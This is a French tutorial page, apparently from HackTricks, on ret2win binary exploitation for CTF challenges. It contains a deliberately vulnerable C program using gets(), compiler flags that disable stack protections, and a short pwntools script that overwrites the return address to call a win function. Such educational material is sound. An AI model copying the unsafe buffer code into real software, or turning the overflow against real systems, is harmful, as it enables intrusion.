# Ret2win

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Informations de base

Les d√©fis **Ret2win** sont une cat√©gorie populaire dans les comp√©titions de **Capture The Flag (CTF)**, en particulier dans les t√¢ches impliquant **l'exploitation binaire**. L'objectif est d'exploiter une vuln√©rabilit√© dans un binaire donn√© pour ex√©cuter une fonction sp√©cifique et non invoqu√©e √† l'int√©rieur du binaire, souvent nomm√©e `win`, `flag`, etc. Cette fonction, lorsqu'elle est ex√©cut√©e, affiche g√©n√©ralement un drapeau ou un message de succ√®s. Le d√©fi implique g√©n√©ralement de remplacer l'**adresse de retour** sur la pile pour d√©tourner le flux d'ex√©cution vers la fonction souhait√©e. Voici une explication plus d√©taill√©e avec des exemples :

### Exemple en C

Consid√©rez un programme C simple avec une vuln√©rabilit√© et une fonction `win` que nous avons l'intention d'appeler :
```c
#include <stdio.h>
#include <string.h>

void win() {
printf("Congratulations! You've called the win function.\n");
}

void vulnerable_function() {
char buf[64];
gets(buf); // This function is dangerous because it does not check the size of the input, leading to buffer overflow.
}

int main() {
vulnerable_function();
return 0;
}
```
Pour compiler ce programme sans protections de la pile et avec **ASLR** d√©sactiv√©, vous pouvez utiliser la commande suivante :
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-m32`: Compiler le programme en tant que binaire 32 bits (c'est facultatif mais courant dans les d√©fis CTF).
* `-fno-stack-protector`: D√©sactiver les protections contre les d√©bordements de pile.
* `-z execstack`: Autoriser l'ex√©cution de code sur la pile.
* `-no-pie`: D√©sactiver l'ex√©cutable ind√©pendant de la position pour garantir que l'adresse de la fonction `win` ne change pas.
* `-o vulnerable`: Nommer le fichier de sortie `vulnerable`.

### Exploitation Python utilisant Pwntools

Pour l'exploitation, nous utiliserons **pwntools**, un puissant framework CTF pour √©crire des exploits. Le script d'exploitation cr√©era une charge utile pour d√©border le tampon et √©craser l'adresse de retour avec l'adresse de la fonction `win`.
```python
from pwn import *

# Set up the process and context for the binary
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path

# Find the address of the win function
win_addr = p32(0x08048456)  # Replace 0x08048456 with the actual address of the win function in your binary

# Create the payload
# The buffer size is 64 bytes, and the saved EBP is 4 bytes. Hence, we need 68 bytes before we overwrite the return address.
payload = b'A' * 68 + win_addr

# Send the payload
p.sendline(payload)
p.interactive()
```
Pour trouver l'adresse de la fonction `win`, vous pouvez utiliser **gdb**, **objdump**, ou tout autre outil vous permettant d'inspecter les fichiers binaires. Par exemple, avec `objdump`, vous pourriez utiliser :
```sh
objdump -d vulnerable | grep win
```
Cette commande vous montrera l'assemblage de la fonction `win`, y compris son adresse de d√©but.

Le script Python envoie un message soigneusement con√ßu qui, lorsqu'il est trait√© par la `vulnerable_function`, d√©borde le tampon et remplace l'adresse de retour sur la pile par l'adresse de `win`. Lorsque `vulnerable_function` retourne, au lieu de retourner √† `main` ou de sortir, elle saute √† `win`, et le message est imprim√©.

## Protections

* [**PIE**](../common-binary-protections-and-bypasses/pie/) **doit √™tre d√©sactiv√©** pour que l'adresse soit fiable √† travers les ex√©cutions, sinon l'adresse o√π la fonction sera stock√©e ne sera pas toujours la m√™me et vous auriez besoin d'une fuite pour d√©terminer o√π se trouve la fonction win. Dans certains cas, lorsque la fonction qui provoque le d√©bordement est `read` ou similaire, vous pouvez effectuer un **D√©bordement Partiel** de 1 ou 2 octets pour changer l'adresse de retour pour qu'elle soit la fonction win. En raison du fonctionnement de l'ASLR, les trois derniers nibbles hexad√©cimaux ne sont pas randomis√©s, donc il y a une **chance de 1/16** (1 nibble) d'obtenir la bonne adresse de retour.
* Les [**Canaries de la pile**](../common-binary-protections-and-bypasses/stack-canaries/) doivent √©galement √™tre d√©sactiv√©s, sinon l'adresse de retour EIP compromise ne sera jamais suivie.

## Autres exemples & R√©f√©rences

* [https://ir0nstone.gitbook.io/notes/types/stack/ret2win](https://ir0nstone.gitbook.io/notes/types/stack/ret2win)
* [https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html](https://guyinatuxedo.github.io/04-bof\_variable/tamu19\_pwn1/index.html)
* 32 bits, pas d'ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw16\_warmup/index.html)
* 64 bits avec ASLR, avec une fuite de l'adresse du binaire
* [https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/csaw18\_getit/index.html)
* 64 bits, pas d'ASLR
* [https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html](https://guyinatuxedo.github.io/05-bof\_callfunction/tu17\_vulnchat/index.html)
* 32 bits, pas d'ASLR, double petit d√©bordement, d'abord pour d√©border la pile et agrandir la taille du deuxi√®me d√©bordement
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32 bits, relro, pas de canary, nx, pas de pie, cha√Æne de format pour √©craser l'adresse `fflush` avec la fonction win (ret2win)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tamu19\_pwn2/index.html)
* 32 bits, nx, rien d'autre, √©crasement partiel de l'EIP (1 octet) pour appeler la fonction win
* [https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/tuctf17\_vulnchat2/index.html)
* 32 bits, nx, rien d'autre, √©crasement partiel de l'EIP (1 octet) pour appeler la fonction win
* [https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html](https://guyinatuxedo.github.io/35-integer\_exploitation/int\_overflow\_post/index.html)
* Le programme ne valide que le dernier octet d'un nombre pour v√©rifier la taille de l'entr√©e, il est donc possible d'ajouter n'importe quelle taille tant que le dernier octet est dans la plage autoris√©e. Ensuite, l'entr√©e cr√©e un d√©passement de tampon exploit√© avec un ret2win.
* [https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/](https://7rocky.github.io/en/ctf/other/blackhat-ctf/fno-stack-protector/)
* 64 bits, relro, pas de canary, nx, pie. √âcrasement partiel pour appeler la fonction win (ret2win)
